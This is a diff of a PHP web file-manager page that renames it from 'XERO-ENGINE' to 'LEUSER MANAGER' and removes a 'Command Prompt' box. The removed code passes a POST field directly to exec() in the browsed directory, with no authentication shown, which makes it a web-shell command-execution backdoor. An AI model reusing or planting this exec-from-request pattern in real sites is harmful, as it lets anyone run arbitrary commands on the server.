@@ -388,24 +388,6 @@ if (isset($_POST['delete_scan_result']) && isset($_POST['scan_file_path'])) {
     }
 }
 
-// ============================================================
-// ================ COMMAND PROMPT =============================
-// ============================================================
-$cmdOutput = null;
-$cmdStatus = null;
-if (isset($_POST['exec_cmd'])) {
-    $cmd = trim($_POST['cmd']);
-    if ($cmd !== '') {
-        // Pindah ke direktori yang sedang dilihat
-        chdir($real);
-        $output = [];
-        $return_var = 0;
-        exec($cmd, $output, $return_var);
-        $cmdOutput = implode("\n", $output);
-        $cmdStatus = ($return_var === 0) ? 'success' : 'error';
-    }
-}
-
 $logo_url = "https://ik.imagekit.io/ewgjpg3n7/assets/sg-removebg-preview.png";
 
 function makeBreadcrumb($p) {
@@ -427,7 +409,7 @@ function makeBreadcrumb($p) {
 <html>
 <head>
 <link rel="icon" href="https://ik.imagekit.io/ewgjpg3n7/assets/sg-removebg-preview.png">
-<title>XERO-ENGINE</title>
+<title>LEUSER MANAGER</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
 /* =========================================================
@@ -854,7 +836,7 @@ function showScanDetails(index) {
 <body>
 
 <div class="header-flex">
-    <h2>XERO-ENGINE</h2>
+    <h2>LEUSER MANAGER</h2>
     <img src="<?php echo $logo_url; ?>" height="55" alt="Logo">
 </div>
 
@@ -948,24 +930,6 @@ function showScanDetails(index) {
             Scan .php, .phtml, config, dll.
         </p>
     </div>
-
-    <!-- ============ COMMAND PROMPT BOX ============ -->
-<div class="action-box" style="border-color:#00ff6a;">
-    <h3 style="color:#00ff6a;">⚡ Command Prompt</h3>
-    <div style="font-size:0.8rem;color:#888;margin-bottom:6px;">
-        <span style="color:#00ff6a;">$</span> <span id="pwd_display"><?php echo htmlspecialchars($real); ?></span>
-    </div>
-    <form method="post">
-        <input name="cmd" placeholder="ls -la" style="width:100%;" autofocus>
-        <button type="submit" name="exec_cmd" style="background:#00ff6a;color:#000;">Run</button>
-    </form>
-    <?php if ($cmdStatus !== null): ?>
-        <div class="<?php echo $cmdStatus === 'success' ? 'alert-success' : 'alert-error'; ?>" 
-             style="margin-top:8px;white-space:pre-wrap;word-wrap:break-word;max-height:300px;overflow-y:auto;">
-            <?php echo htmlspecialchars($cmdOutput); ?>
-        </div>
-    <?php endif; ?>
-</div>
 
 </div>
 
